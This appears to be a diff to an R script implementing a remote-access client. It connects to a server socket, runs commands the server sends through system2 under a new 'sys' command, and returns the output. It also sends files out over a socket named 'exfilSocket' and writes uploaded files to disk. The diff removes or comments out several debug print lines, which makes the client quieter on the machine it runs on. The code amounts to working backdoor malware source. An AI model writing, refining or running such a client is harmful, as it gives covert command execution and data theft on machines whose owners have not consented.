@@ -7,7 +7,7 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
   exiting <- FALSE
   toServer <- "Connected"
   while(!exiting) {
-    print(toServer)
+#    print(toServer)
     writeLines(as.character(toServer), socket)
     rawCommand <- readLines(socket, 1)
     command <- strsplit(rawCommand, " ", fixed=TRUE)[[1]]
@@ -51,7 +51,7 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
         }, error=function(e) {
           paste("Error: ", e$message)
         }, warning=function(w) {
-          #Do nothing
+          "This is not a text file"
         }, finally=function() {
           close(targetFile)
         })
@@ -77,7 +77,7 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
           writeLines("-1", socket)
           paste("Error reading file: ", e$message)
         }, warning=function(w){
-          #Do nothing
+          paste("Warning: ", w$message)
         }, finally=function(){
           close(targetFile)
         })
@@ -90,6 +90,8 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
               "Download Complete!"
           }, error=function(e){
             paste("Client error transmitting file: ", e$message)
+          }, warning=function(w){
+            paste("Warning: ", w$message)
           }, finally=function(){
             close(exfilSocket)
           })
@@ -118,12 +120,10 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
         })
         if(!abortUpload) {
           toServer <- tryCatch({
-            print(fileData)
             outFile <- file(fileName, "wb")
             writeBin(as.raw(fileData), outFile, size=1)
             "File successfully written!"
           }, error=function(e){
-            print(e$message)
             paste("Error writing received data: ", e$message)
           }, finally=function(){
             close(outFile)
@@ -132,19 +132,19 @@ client <- function(host="localhost", port=4471, secondaryPort=5472) {
           toServer <- fileData
         }
       }
-      else {
+      else if (command[1] == "sys") {
         toServer <- tryCatch({
-          rawValue <- paste(system2(command[1], stdout=TRUE, args=command[-1]), collapse="%&%")
+          paste(system2(command[2], stdout=TRUE, args=command[-(1:2)]), collapse="%&%")
         }, error= function(e) {
           paste("Error: ", e$message)
         }, warning=function(w) {
-          #Do nothing
+          paste("Warning: ", w$message)
         })
+      } else {
+        toServer <- paste("Command ", command[1], " not recognized.", sep="'")
       }
     }
   }
   close(socket)
-  print("Socket closed")
+#  print("Socket closed")
 }
-
-client()
